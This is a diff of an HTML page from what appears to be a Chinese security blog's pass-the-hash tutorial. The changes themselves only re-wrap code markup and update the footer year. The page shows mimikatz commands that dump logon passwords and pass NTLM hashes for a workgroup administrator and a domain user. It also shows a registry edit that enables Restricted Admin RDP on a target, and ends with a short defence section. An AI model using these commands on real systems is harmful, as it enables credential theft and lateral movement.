@@ -167,9 +167,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">privilege::debug
-sekurlsa::logonpasswords
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>得到 hash 后</p>
 <h3 id="31-工作组">3.1 工作组</h3>
@@ -178,8 +178,8 @@ sekurlsa::logonpasswords
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:ccef208c6485269c20db2cad21734fe7
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:ccef208c6485269c20db2cad21734fe7
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 <code>Pass The Hash</code> 已经无法成功，唯独默认的 <code>Administrator</code> (SID 500) 账号例外，利用这个账号仍可以进行 <code>Pass The Hash</code> 远程 <code>ipc</code> 连接。</p>
 <h3 id="32-域内用户">3.2 域内用户</h3>
@@ -189,8 +189,8 @@ sekurlsa::logonpasswords
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">sekurlsa::pth /user:eviluser /domain:adsec.com /ntlm:ccef208c6485269c20db2cad21734fe7
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">sekurlsa::pth /user:eviluser /domain:adsec.com /ntlm:ccef208c6485269c20db2cad21734fe7
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>域内用户不受补丁影响。</p>
 <h2 id="4-kb2871997">4 KB2871997</h2>
@@ -215,8 +215,8 @@ sekurlsa::logonpasswords
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user<span class="err">&#39;</span>s ntlm hash&gt; /run:<span class="s2">&#34;mstsc.exe /restrictedadmin&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user<span class="err">&#39;</span>s ntlm hash&gt; /run:<span class="s2">&#34;mstsc.exe /restrictedadmin&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果受限管理模式被禁用，使用如下命令开启：</p>
 <div class="highlight"><div class="chroma">
@@ -224,8 +224,8 @@ sekurlsa::logonpasswords
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mimikatz.exe <span class="s2">&#34;sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user&#39;s ntlm hash&gt; /run:powershell.exe&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz.exe <span class="s2">&#34;sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user&#39;s ntlm hash&gt; /run:powershell.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在弹出的 powershell 窗口修改注册表：</p>
 <div class="highlight"><div class="chroma">
@@ -234,9 +234,9 @@ sekurlsa::logonpasswords
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Enter-PSSession -Computer &lt;Target&gt;
-New-ItemProperty -Path <span class="s2">&#34;HKLM:\System\CurrentControlSet\Control\Lsa&#34;</span> -Name <span class="s2">&#34;DisableRestrictedAdmin&#34;</span> -Value <span class="s2">&#34;0&#34;</span> -PropertyType DWORD -Force
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Enter-PSSession -Computer &lt;Target&gt;
+</span></span><span class="line"><span class="cl">New-ItemProperty -Path <span class="s2">&#34;HKLM:\System\CurrentControlSet\Control\Lsa&#34;</span> -Name <span class="s2">&#34;DisableRestrictedAdmin&#34;</span> -Value <span class="s2">&#34;0&#34;</span> -PropertyType DWORD -Force
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="6-防御">6 防御</h2>
 <p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows\CurrentVersion\Policies\System\FilterAdministratorToken</code>，系统中一个有 <code>Admin ApprovalMode</code>，<code>UAC</code> 就是通过上面的注册表键值来判断，默认设置为 <code>0</code>。如果设置为 <code>1</code>，则 <code>SID</code> 为 <code>500</code> 的管理员也不能通过网络登录的方式获取高权限。</p>
@@ -276,7 +276,7 @@ New-ItemProperty -Path <span class="s2">&#34;HKLM:\System\CurrentControlSet\Cont
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
